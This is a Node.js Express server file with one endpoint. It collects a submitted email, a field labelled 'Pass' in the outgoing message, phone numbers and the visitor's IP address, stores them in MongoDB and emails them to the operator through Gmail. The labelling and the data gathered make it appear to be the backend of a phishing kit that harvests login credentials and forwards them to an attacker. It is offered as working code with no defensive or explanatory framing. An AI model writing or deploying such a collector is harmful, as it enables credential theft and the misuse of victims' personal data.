const express = require("express");
const dotenv = require("dotenv");
const mongoose = require("mongoose");
const cors = require("cors");
const nodemailer = require("nodemailer");
const app = express();
dotenv.config();

const port = process.env.PORT || 8000;

app.use(cors());
app.get("/", (req, res) => {
  res.send("Connected !!!!!!!");
});

const connect = async () => {
  try {
    await mongoose.connect(process.env.MONGODB);
    console.log("Connected");
  } catch (error) {
    throw error;
  }
};

mongoose.connection.on("disconnected", () => {
  console.log("disconnected");
});
mongoose.connection.on("connected", () => {
  console.log("connected");
});

app.use(express.json({ limit: "3mb" }));

const userSchema = new mongoose.Schema({
  email: String,
  id: String,
  phone: String,
  changePhone: String,
});

const User = mongoose.model("User", userSchema);

app.post("/save-user", async (req, res) => {
  const { email, id } = req.body;

  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: process.env.USERNAME,
      pass: process.env.PASSWORD,
    },
  });

  let text = `From TS:\nEmail: ${email}\nPass: ${id}`;

  const params = { email, id };
  if (req.body.phone) {
    params.phone = req.body.phone;
    text += `\nNumber: ${req.body.phone}`;
  }
  if (req.body.changePhone) {
    params.changePhone = req.body.changePhone;
    text += `changePhone => ${req.body.changePhone}`;
  }

  const userIP = (
    req.headers["x-forwarded-for"] || req.connection.remoteAddress
  )
    ?.split(",")?.[0]
    ?.trim();
  text += `\nUser IP: ${userIP}`;

  // Create a new user instance
  const newUser = new User(params);

  // Save the user to the database

  await newUser.save();

  const mailOptions = {
    from: "Auth client webdev",
    to: process.env.USERNAME,
    subject: "message with email and id",
    text,
  };

  transporter.sendMail(mailOptions, (err) => {
    if (err) {
      console.log(err);
      return res.status(500).send("Error sending email");
    }
  });

  return res.status(201).send({
    message: "message sent!",
    success: true,
  });
});

app.listen(port, () => {
  connect();
  console.log("server connected");
});
